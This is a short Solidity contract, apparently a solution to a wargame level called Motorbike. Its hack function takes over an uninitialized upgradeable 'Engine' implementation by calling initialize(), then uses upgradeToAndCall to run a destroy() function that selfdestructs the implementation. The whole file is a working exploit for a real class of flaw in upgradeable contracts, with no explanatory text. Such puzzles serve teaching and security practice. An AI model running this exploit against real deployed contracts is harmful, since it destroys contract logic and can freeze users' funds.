// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract AttackMotorbike {
    function hack(IEngine target) external {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSignature("destroy()"));
    }

    function destroy() external {
        selfdestruct(payable(address(0)));
    }
}
